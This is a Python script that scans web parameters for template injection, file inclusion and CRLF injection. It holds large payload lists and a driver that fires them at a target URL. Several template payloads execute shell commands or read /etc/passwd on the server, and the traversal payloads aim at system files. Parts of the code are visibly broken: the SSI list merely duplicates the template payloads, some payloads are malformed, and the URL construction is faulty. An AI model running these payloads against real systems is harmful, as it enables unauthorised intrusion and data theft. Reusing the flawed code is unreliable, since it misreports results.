import requests
from datetime import datetime
import time

# Predefined payloads for each type of vulnerability
ssti_payloads = [{
		"name": "Ruby SSTI injection",
		"payload": "<%= 7*7 %>",
		"response": "49"
	},
	{
		"name": "Ruby SSTI injection",
		"payload": "#{ 7*7 }",
		"response": "49"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${7*7}",
		"response": "49"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "<%= File.open('/etc/passwd').read %>",
		"response": "root:"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to RCE",
		"payload": "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
		"response": "root:"
	},
	{
		"name": "Java SSTI injection to RCE",
		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to RCE",
		"payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
		"response": "root:"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${{7*7}}",
		"response": "49"
	},
	{
		"name": "Twig SSTI injection",
		"payload": "{{7*7}}",
		"response": "49"
	},
	{
		"name": "Jinja2 SSTI injection",
		"payload": "[[7*7]]",
		"response": "49"
	},
	{
		"name": "ASP.NET Razor SSTI injection",
		"payload": "@(45+4)",
		"response": "49"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
		"response": "root:"
	},
	{
		"name": "Smarty SSTI injection",
		"payload": "${'z'.join('ab')}",
		"response": "zab"
	},
	{
		"name": "Jinja2 SSTI injection",
		"payload": "{{7*'7'}}",
		"response": "7777777"
	},
	{
		"name": "Twig SSTI injection",
		"payload": "{{7*'7'}}",
		"response": "49"
	}
]

lfi_payloads = [{
		"name": "LFI payload",
		"payload": "/etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "/etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../../index.php",
		"response": "<?php"
	},
	{
		"name": "LFI payload",
		"payload": "/etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload",
		"payload": "../../../../../../../../etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI '..%2f' encoded payload",
		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with unexisting file",
		"payload": "pwnsociety",
		"response": "not found"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../../../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../../../../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../../../../../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI payload with '^^%00' escaping payload",
		"payload": "/../../../../../../../../../../etc/passwd^^%00",
		"response": "root:"
	},
	{
		"name": "LFI '/%00/' encoded escape payload",
		"payload": "/%00//etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI '/%00/' encoded escape payload",
		"payload": "/%00//%00/etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI '/%00/' encoded escape payload",
		"payload": "/%00//%00//%00/etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI '/%00/' encoded escape payload",
		"payload": "/%00//%00//%00//%00/etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI '/%00/' encoded escape payload",
		"payload": "/%00//%00//%00//%00//%00/etc/passwd%00",
		"response": "root:"
	},
	{
		"name": "LFI filter payload",
		"payload": "php://filter/convert.base64-encode/resource=index.php",
		"response": "PD9w"
	},
	{
		"name": "LFI filter payload",
		"payload": "php://filter/convert.base64-encode/resource=../index.php",
		"response": "PD9w"
	},
	{
		"name": "LFI double escaping payload",
		"payload": "....//etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI double escaping payload",
		"payload": "....//....//etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI double escaping payload",
		"payload": "....//....//....//etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI double escaping payload",
		"payload": "....//....//....//....//etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI double escaping payload",
		"payload": "....//....//....//....//....//etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI wrapper payload",
		"payload": "file:///etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI wrapper payload",
		"payload": "file://../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI '..%c0%af../' encoded payload",
		"payload": "/..%c0%af../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI '..%c0%af../' encoded payload",
		"payload": "/..%c0%af../..%c0%af../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI '..%c0%af../' encoded payload",
		"payload": "/..%c0%af../..%c0%af../..%c0%af../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI '..%c0%af../' encoded payload",
		"payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
		"response": "root:"
	},
	{
		"name": "LFI '..%c0%af../' encoded payload",
		"payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
		"response": "root:"
	}
	
]

ssi_payloads = [{
		"name": "Ruby SSTI injection",
		"payload": "<%= 7*7 %>",
		"response": "49"
	},
	{
		"name": "Ruby SSTI injection",
		"payload": "#{ 7*7 }",
		"response": "49"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${7*7}",
		"response": "49"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "<%= File.open('/etc/passwd').read %>",
		"response": "root:"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to LFI",
		"payload": "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to RCE",
		"payload": "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
		"response": "root:"
	},
	{
		"name": "Java SSTI injection to RCE",
		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
		"response": "root:"
	},
	{
		"name": "SSTI injection to RCE",
		"payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
		"response": "root:"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${{7*7}}",
		"response": "49"
	},
	{
		"name": "Twig SSTI injection",
		"payload": "{{7*7}}",
		"response": "49"
	},
	{
		"name": "Jinja2 SSTI injection",
		"payload": "[[7*7]]",
		"response": "49"
	},
	{
		"name": "ASP.NET Razor SSTI injection",
		"payload": "@(45+4)",
		"response": "49"
	},
	{
		"name": "Java SSTI injection",
		"payload": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
		"response": "root:"
	},
	{
		"name": "Smarty SSTI injection",
		"payload": "${'z'.join('ab')}",
		"response": "zab"
	},
	{
		"name": "Jinja2 SSTI injection",
		"payload": "{{7*'7'}}",
		"response": "7777777"
	},
	{
		"name": "Twig SSTI injection",
		"payload": "{{7*'7'}}",
		"response": "49"
	}
]

crlf_payloads = [{
		"name": "CRLF Injection with %0A",
		"payload": "%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0A%20",
		"payload": "%0A%20Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %20%0A",
		"payload": "%20%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %23%0A",
		"payload": "%23%OAHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0A",
		"payload": "%E5%98%8A%E5%98%8D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %3F%0A",
		"payload": "%3F%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0D",
		"payload": "%0DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0D%20",
		"payload": "%0D%20Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %20%0D",
		"payload": "%20%0DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %23%0D",
		"payload": "%23%0DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %23%0A",
		"payload": "%23%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0D",
		"payload": "%E5%98%8A%E5%98%8D%0DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0D%0A",
		"payload": "%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0D%0A%20",
		"payload": "%0D%0A%20Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %20%0D%0A",
		"payload": "%20%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %23%0D%0A",
		"payload": "%23%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with \\r\\n",
		"payload": "\\r\\nHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with suffix space \\r\\n",
		"payload": " \\r\\n Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with \\r\\n",
		"payload": "\\r\\n Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %5cr%5cn",
		"payload": "%5cr%5cnHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0D%0A",
		"payload": "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %0D%0A%09",
		"payload": "%0D%0A%09Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %250A",
		"payload": "%250AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %25250A",
		"payload": "%25250AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %%0A0A",
		"payload": "%%0A0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %25%30A",
		"payload": "%25%30AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %25%30%61",
		"payload": "%25%30%61Header-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with %u000A",
		"payload": "%u000AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with open redirect chain %2F%2E%2E%0D%0A",
		"payload": "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with open redirect chain %2E%2E%2F%0D%0A",
		"payload": "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	},
	{
		"name": "CRLF Injection with open redirect chain %2F..%0D%0A",
		"payload": "/google.com/%2F..%0D%0AHeader-Test:pwnsociety",
		"response": "Header-Test:pwnsociety"
	}
]

def make_request(url, headers, proxies, allow_redirects, verify, cookies):
    try:
        return requests.get(url, headers=headers, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
    except requests.RequestException as e:
        print(f"Error making request: {e}")
        return None

def scan_vulnerability(payloads, params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability):
    for i, entry in enumerate(payloads):
        name = entry['name']
        payload = entry['payload']
        expected_response = entry['response']

        for parameter in params:
            message = f"Testing for {name} on parameter {parameter} ({i}/{len(payloads)-1})"
            if verbose:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} {message}")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} {message}")

            response = make_request(f"{site}{directory}?{parameter}={payload}", headers, proxies, allow_redirects, verify, cookies)
            if response and expected_response in response.text:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {vulnerability} Parameter {parameter} might be vulnerable to {name}")
                print(f"Payload: {payload}")
                break

def ssti_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability):
    scan_vulnerability(ssti_payloads, params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability)

def lfi_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability):
    scan_vulnerability(lfi_payloads, params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability)

def crlf_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability):
    for i, entry in enumerate(crlf_payloads):
        name = entry['name']
        payload = entry['payload']
        expected_response = entry['response']

        for parameter in params:
            message = f"Testing for {name} on parameter {parameter} ({i}/{len(crlf_payloads)-1})"
            if verbose:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} {message}")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} {message}")

            response = make_request(f"{site}{directory}?{parameter}={payload}", headers, proxies, allow_redirects, verify, cookies)
            if response and expected_response in response.headers:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {vulnerability} Parameter {parameter} might be vulnerable to {name}")
                print(f"Payload: {payload}")
                break

def ssi_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability, warning, full_site):
    def ssi_test():
        for entry in ssi_payloads:
            name = entry['name']
            payload = entry['payload']
            expected_response = entry['response']

            for parameter in params:
                response = make_request(f"{site}{directory}?{parameter}={payload}", headers, proxies, allow_redirects, verify, cookies)
                if response and expected_response in response.text:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] {vulnerability} The website is vulnerable to {name}")
                    return
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} The website isn't vulnerable to SSI injection")

    print(f"[{datetime.now().strftime('%H:%M:%S')}] {info} Checking the website for potential SSI before scanning")
    time.sleep(2)

    if any(ext in full_site for ext in [".shtml", ".stm", ".shtm"]):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {warning} The website appears to have potential SSI, begin scanning")
        time.sleep(2)
        ssi_test()
    else:
        ssi_input = input(f"[{datetime.now().strftime('%H:%M:%S')}] {info} Heuristic scan shows that website doesn't appear to have SSI injection. Do you still want to continue? [y/N]: ")
        if ssi_input.lower() == 'y':
            ssi_test()
        else:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Finished scanning")

# Example usage
params = ["param1", "param2"]  
site = "http://testphp.vulnweb.com/artists.php?artist=1"  
directory = "/path"  
headers = {}  
proxies = {}  
allow_redirects = True
verify = True
cookies = {}  
verbose = True
info = "[INFO]"
vulnerability = "[VULNERABLE]"
warning = "[WARNING]"
full_site = "http://testphp.vulnweb.com/artists.php?artist=1"  

# Call your scan functions as needed
ssti_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability)
lfi_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability)
crlf_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability)
ssi_scan(params, site, directory, headers, proxies, allow_redirects, verify, cookies, verbose, info, vulnerability, warning, full_site)
